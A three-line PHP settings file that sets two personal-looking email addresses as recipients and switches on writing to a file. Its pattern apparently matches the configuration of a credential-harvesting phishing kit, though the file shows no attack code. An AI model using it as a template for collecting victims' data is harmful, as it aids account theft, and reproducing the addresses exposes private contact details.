<?php
	$e_mail="nacerislam2020@gmail.com,khalidahihsp@hotmail.com";
	$writeInFile=true;
?>